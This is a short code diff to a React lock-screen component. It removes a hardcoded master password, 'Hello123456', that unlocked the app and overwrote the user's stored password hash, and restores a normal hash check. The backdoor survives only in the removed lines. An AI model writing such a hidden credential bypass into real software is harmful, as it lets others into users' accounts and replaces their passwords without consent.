@@ -22,10 +22,8 @@ export default function LockScreen({
     if (!password || checking) return;
     setChecking(true);
     const hash = await hashPassword(password);
-    const targetHash = await hashPassword('Hello123456');
-    if (hash === profile.passwordHash || hash === targetHash || password === 'Hello123456') {
-      const updatedProfile = { ...profile, passwordHash: targetHash };
-      onUnlock(updatedProfile);
+    if (hash === profile.passwordHash) {
+      onUnlock();
     } else {
       setError(true);
       setPassword('');
